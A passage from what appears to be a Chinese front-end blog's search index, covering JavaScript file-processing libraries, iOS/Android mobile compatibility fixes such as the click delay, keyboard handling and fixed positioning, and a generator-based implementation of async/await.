data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657477829197-4b9a5388-8966-4e34-a492-f15bc4816485.png?x-oss-process=image/resize,w_882,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="fv8rX"></a></p><h2 id="（3）textract"><a href="#（3）textract" class="headerlink" title="（3）textract"></a>（3）textract</h2><p>textract 是一个 node.js 模块，用于从 html、pdf、doc、docx、xls、xlsx、csv、pptx、png、jpg、gif、rtf 等中提取文本。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657477790788-15e888ca-153e-4527-b209-cd147ffbb850.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657477790788-15e888ca-153e-4527-b209-cd147ffbb850.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="OrXng"></a></p><h2 id="（4）PptxGenJS"><a href="#（4）PptxGenJS" class="headerlink" title="（4）PptxGenJS"></a>（4）PptxGenJS</h2><p>PptxGenJS 是一个使用功能强大、简洁的 JavaScript API 创建 PowerPoint 演示文稿。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657477876415-677a8519-d32f-4c40-97d8-7e03df74db21.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657477876415-677a8519-d32f-4c40-97d8-7e03df74db21.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="EShJw"></a></p><h2 id="（5）officegen"><a href="#（5）officegen" class="headerlink" title="（5）officegen"></a>（5）officegen</h2><p>officegen 是一个用于 JavaScript 中 Word (docx)、PowerPoint (pptx) 和 Excell (xlsx) 的独立 Office Open XML 文件（Microsoft Office 2007 及更高版本）生成器。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657478146268-be5fbfc2-cced-420c-83ab-7850444598b5.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657478146268-be5fbfc2-cced-420c-83ab-7850444598b5.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="wlC6r"></a></p><h2 id="（6）PapaParse"><a href="#（6）PapaParse" class="headerlink" title="（6）PapaParse"></a>（6）PapaParse</h2><p>PapaParse 是一个快速而强大的 CSV（分隔文本）解析器，可以优雅地处理大文件和格式错误的输入。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657478027071-66df0d49-f1c8-48cb-afbb-f43701ff4975.png?x-oss-process=image/resize,w_841,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1657478027071-66df0d49-f1c8-48cb-afbb-f43701ff4975.png?x-oss-process=image/resize,w_841,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><br /> ]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
            <tag> 文件处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js常见兼容问题</title>
      <link href="/2021/12/21/compatible/js-compatible/"/>
      <url>/2021/12/21/compatible/js-compatible/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><a name="aqBRj"></a><h3 id="iPhone7用for…in-遍历数组失效"><a href="#iPhone7用for…in-遍历数组失效" class="headerlink" title="iPhone7用for…in 遍历数组失效"></a>iPhone7用for…in 遍历数组失效</h3><p>问题描述：最初学习使用js时，觉得<code>for...in</code>遍历比<code>for循环</code>简洁，后期在用户反馈后发现iPhone7不支持用for…in遍历数组<br />解决方式： 改为<code>for循环</code>遍历</p><p><a name="kiAHW"></a></p><h3 id="移动端点击事件300-ms延迟问题"><a href="#移动端点击事件300-ms延迟问题" class="headerlink" title="移动端点击事件300 ms延迟问题"></a>移动端点击事件300 ms延迟问题</h3><p>问题描述：移动端web网页是有300ms延迟的，往往会造成按钮点击延迟甚至是点击失效。<br />解决方式：</p><ul><li>fastclick可以解决在手机上点击事件的300ms延迟</li><li>zepto.js的touch模块，tap事件也是为了解决在click的延迟问题</li></ul><p><a name="nK6Db"></a></p><h3 id="audio-和-video-在-ios-和-andriod-中自动播放"><a href="#audio-和-video-在-ios-和-andriod-中自动播放" class="headerlink" title="audio 和 video 在 ios 和 andriod 中自动播放"></a>audio 和 video 在 ios 和 andriod 中自动播放</h3><p>出于优化用户体验，苹果系统和安卓系统通常都会禁止自动播放和禁止页面加载时使用 JS 触发播放，必须由用户主动点击页面才可以触发播放。通过给页面根元素加touchstart的监听事件实现触发播放</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">one</span>(<span class="string">&#x27;touchstart&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  audio.<span class="title function_">play</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><a name="aIKcn"></a></p><h3 id="iOS-上拉边界下拉出现空白"><a href="#iOS-上拉边界下拉出现空白" class="headerlink" title="iOS 上拉边界下拉出现空白"></a>iOS 上拉边界下拉出现空白</h3><p>问题描述：手指按住屏幕下拉，屏幕顶部会多出一块白色区域。手指按住屏幕上拉，底部多出一块白色区域。<br />产生原因：在 iOS 中，手指按住屏幕上下拖动，会触发 touchmove 事件。这个事件触发的对象是整个 webview 容器，容器自然会被拖动，剩下的部分会成空白。<br />解决方式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">addEventListener</span>(</span><br><span class="line">  <span class="string">&#x27;touchmove&#x27;</span>,</span><br><span class="line">  <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (e.<span class="property">_isScroller</span>) <span class="keyword">return</span></span><br><span class="line">    <span class="comment">// 阻止默认事件</span></span><br><span class="line">    e.<span class="title function_">preventDefault</span>()</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">passive</span>: <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><a name="emtPB"></a></p><h3 id="ios-日期转换-NAN-的问题"><a href="#ios-日期转换-NAN-的问题" class="headerlink" title="ios 日期转换 NAN 的问题"></a>ios 日期转换 NAN 的问题</h3><p>将日期字符串的格式符号替换成’&#x2F;‘</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;yyyy-MM-dd&#x27;</span>.<span class="title function_">replace</span>(<span class="regexp">/-/g</span>, <span class="string">&#x27;/&#x27;</span>)</span><br></pre></td></tr></table></figure><p><a name="ibcS5"></a></p><h3 id="软键盘问题"><a href="#软键盘问题" class="headerlink" title="软键盘问题"></a>软键盘问题</h3><p><a name="oXllV"></a></p><h4 id="iOS-系统中文输入法输入英文时，字母之间可能会出现一个六分之一空格"><a href="#iOS-系统中文输入法输入英文时，字母之间可能会出现一个六分之一空格" class="headerlink" title="iOS 系统中文输入法输入英文时，字母之间可能会出现一个六分之一空格"></a>iOS 系统中文输入法输入英文时，字母之间可能会出现一个六分之一空格</h4><p>解决方式：可以通过正则去掉</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">value</span> = <span class="variable language_">this</span>.<span class="property">value</span>.<span class="title function_">replace</span>(<span class="regexp">/\u2006/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure><p><a name="Qmh75"></a></p><h4 id="IOS-键盘弹起挡住原来的视图"><a href="#IOS-键盘弹起挡住原来的视图" class="headerlink" title="IOS 键盘弹起挡住原来的视图"></a>IOS 键盘弹起挡住原来的视图</h4><p>解决方式：</p><ul><li>可以通过监听移动端软键盘弹起 Element.scrollIntoViewIfNeeded（Boolean）方法用来将不在浏览器窗口的可见区域内的元素滚动到浏览器窗口的可见区域。 如果该元素已经在浏览器窗口的可见区域内，则不会发生滚动。</li><li>true，则元素将在其所在滚动区的可视区域中居中对齐。</li><li>false，则元素将与其所在滚动区的可视区域最近的边缘对齐。 根据可见区域最靠近元素的哪个边缘，元素的顶部将与可见区域的顶部边缘对准，或者元素的底部边缘将与可见区域的底部边缘对准。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;resize&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">activeElement</span>.<span class="property">tagName</span> === <span class="string">&#x27;INPUT&#x27;</span> ||</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">activeElement</span>.<span class="property">tagName</span> === <span class="string">&#x27;TEXTAREA&#x27;</span></span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="string">&#x27;scrollIntoView&#x27;</span> <span class="keyword">in</span> <span class="variable language_">document</span>.<span class="property">activeElement</span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">activeElement</span>.<span class="title function_">scrollIntoView</span>(<span class="literal">false</span>)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">activeElement</span>.<span class="title function_">scrollIntoViewIfNeeded</span>(<span class="literal">false</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">0</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><a name="RQUuS"></a></p><h4 id="onkeyUp-和-onKeydown-兼容性问题"><a href="#onkeyUp-和-onKeydown-兼容性问题" class="headerlink" title="onkeyUp 和 onKeydown 兼容性问题"></a>onkeyUp 和 onKeydown 兼容性问题</h4><p>IOS 中 input 键盘事件 keyup、keydown、等支持不是很好, 用 input 监听键盘 keyup 事件，在安卓手机浏览器中没有问题，但是在 ios 手机浏览器中用输入法输入之后，并未立刻相应 keyup 事件</p><p><a name="vb5qX"></a></p><h4 id="IOS12-输入框难以点击获取焦点，弹不出软键盘"><a href="#IOS12-输入框难以点击获取焦点，弹不出软键盘" class="headerlink" title="IOS12 输入框难以点击获取焦点，弹不出软键盘"></a>IOS12 输入框难以点击获取焦点，弹不出软键盘</h4><p>定位找到问题是 fastclick.js 对 IOS12 的兼容性，可在 fastclick.js 源码或者 main.js 做以下修改</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">FastClick</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">focus</span> = <span class="keyword">function</span>(<span class="params">targetElement</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> length</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    deviceIsIOS &amp;&amp;</span><br><span class="line">    targetElement.<span class="property">setSelectionRange</span> &amp;&amp;</span><br><span class="line">    targetElement.<span class="property">type</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;date&#x27;</span>) !== <span class="number">0</span> &amp;&amp;</span><br><span class="line">    targetElement.<span class="property">type</span> !== <span class="string">&#x27;time&#x27;</span> &amp;&amp;</span><br><span class="line">    targetElement.<span class="property">type</span> !== <span class="string">&#x27;month&#x27;</span></span><br><span class="line">  ) &#123;</span><br><span class="line">    length = targetElement.<span class="property">value</span>.<span class="property">length</span></span><br><span class="line">    targetElement.<span class="title function_">setSelectionRange</span>(length, length)</span><br><span class="line">    targetElement.<span class="title function_">focus</span>()</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    targetElement.<span class="title function_">focus</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="vo5o5"></a></p><h4 id="IOS-键盘收起时页面没用回落，底部会留白"><a href="#IOS-键盘收起时页面没用回落，底部会留白" class="headerlink" title="IOS 键盘收起时页面没用回落，底部会留白"></a>IOS 键盘收起时页面没用回落，底部会留白</h4><p>通过监听键盘回落时间滚动到原来的位置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;focusout&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">scrollTo</span>(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//input输入框弹起软键盘的解决方案。</span></span><br><span class="line"><span class="keyword">var</span> bfscrolltop = <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollTop</span></span><br><span class="line">$(<span class="string">&#x27;input&#x27;</span>)</span><br><span class="line">  .<span class="title function_">focus</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollTop</span> = <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollHeight</span></span><br><span class="line">    <span class="comment">//console.log(document.body.scrollTop);</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">blur</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollTop</span> = bfscrolltop</span><br><span class="line">    <span class="comment">//console.log(document.body.scrollTop);</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="ALt6l"></a></p><h4 id="IOS-下-fixed-失效"><a href="#IOS-下-fixed-失效" class="headerlink" title="IOS 下 fixed 失效"></a>IOS 下 fixed 失效</h4><p>问题描述：软键盘唤起后，页面的 fixed 元素将失效，变成了 absolute，所以当页面超过一屏且滚动时，失效的 fixed 元素就会跟随滚动了。不仅限于 type&#x3D;text 的输入框，凡是软键盘（比如时间日期选择、select 选择等等）被唤起，都会遇到同样地问题。 解决方法: 不让页面滚动，而是让主体部分自己滚动,主体部分高度设为 100%，overflow:scroll</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;warper&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;main&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;fix-bottom&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.warper</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">overflow-y</span>: scroll;</span><br><span class="line">  -webkit-<span class="attribute">overflow</span>-scrolling: touch; </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.fix-bottom</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> compatible </tag>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>async_await及其实现</title>
      <link href="/2021/10/10/frontend/interview/async-await-ji-qi-shi-xian/"/>
      <url>/2021/10/10/frontend/interview/async-await-ji-qi-shi-xian/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>async和await关键字让我们可以用一种更简洁的方式写出基于Promise的异步行为，而无需刻意地链式调用promise。<br><a name="ZFkH2"></a></p><h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><p><code>Promise B</code>需要接受 <code>Promise A</code>的返回值作为下一步计算的参数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">promiseA</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">promiseB</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">`value: <span class="subst">$&#123;value&#125;</span>`</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>在没有async/await时，需要嵌套调用`Promise.then()`</code></pre><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">promiseA</span>().<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">promiseB</span>(res).<span class="title function_">then</span>(<span class="function"><span class="params">res2</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res2)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><pre><code>使用`async/await`: </code></pre><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">fun</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">promiseA</span>();</span><br><span class="line">  <span class="keyword">const</span> res2 = <span class="keyword">await</span> <span class="title function_">promiseB</span>(res);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fun</span>()</span><br></pre></td></tr></table></figure><p>对比起来，async&#x2F;await 更像是在同步处理异步问题，更符合人的阅读直觉。<br><a name="Sg7kZ"></a></p><h1 id="函数生成器模拟实现"><a href="#函数生成器模拟实现" class="headerlink" title="函数生成器模拟实现"></a>函数生成器模拟实现</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">promise1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">promise2</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(<span class="string">&quot;value:&quot;</span> + value);</span><br><span class="line">      <span class="comment">// reject(&quot;错误&quot;);</span></span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">promise3</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="string">&quot;value:&quot;</span> + value);</span><br><span class="line">      &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">readFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> value = <span class="keyword">yield</span> <span class="title function_">promise1</span>();</span><br><span class="line">  <span class="keyword">const</span> value2 = <span class="keyword">yield</span> <span class="title function_">promise2</span>(value);</span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">yield</span> <span class="title function_">promise3</span>(value2);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">asyncGen</span>(<span class="params">fn</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> g = <span class="title function_">fn</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">next</span>(<span class="params">param</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123; value, done &#125; = g.<span class="title function_">next</span>(param);</span><br><span class="line">      <span class="keyword">if</span> (!done) &#123;</span><br><span class="line">        <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(value).<span class="title function_">then</span>(</span><br><span class="line">          <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">next</span>(res);</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">reject</span>(err);</span><br><span class="line">          &#125;</span><br><span class="line">        );</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(param);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">asyncGen</span>(readFile).<span class="title function_">then</span>(</span><br><span class="line">  <span class="function">(<span class="params">res</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(res),</span><br><span class="line">  <span class="function">(<span class="params">err</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> 面试 </tag>
            
            <tag> 原理 </tag>
            
            <tag> 手写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里前端开发规范</title>
      <link href="/2021/10/07/frontend/a-li-qian-duan-kai-fa-gui-fan/"/>
      <url>/2021/10/07/frontend/a-li-qian-duan-kai-fa-gui-fan/</url>
      
